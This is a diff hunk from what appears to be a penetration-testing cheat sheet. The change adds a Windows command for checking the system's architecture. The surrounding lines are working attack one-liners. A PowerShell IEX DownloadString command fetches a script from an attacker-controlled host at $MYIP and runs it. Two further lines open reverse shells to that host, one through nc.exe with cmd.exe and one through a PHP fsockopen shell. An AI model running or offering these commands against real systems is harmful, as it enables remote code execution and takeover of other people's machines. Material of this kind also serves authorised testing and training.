@@ -872,6 +872,9 @@ powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/
 set cmd powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1');"
 
 [*] Shells
++---------- Get Architecture (x86 / x64) ----------+
+wmic os get osarchitecture
+
 +---------- One Liners ----------+
 nc.exe $MYIP 5555 -e cmd.exe
 php -r '$sock=fsockopen("$MYIP",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
